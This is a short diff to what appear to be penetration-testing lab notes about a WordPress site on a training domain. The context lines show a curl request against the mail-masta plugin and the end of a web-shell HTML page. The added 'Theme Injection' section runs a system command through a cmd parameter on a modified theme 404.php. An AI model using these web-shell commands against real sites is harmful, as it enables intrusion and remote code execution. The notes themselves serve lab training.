@@ -95,3 +95,7 @@ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/co
 <script>document.getElementById("cmd").focus();</script>
 </html>
 ```
+## Theme Injection
+```bash
+curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
+```
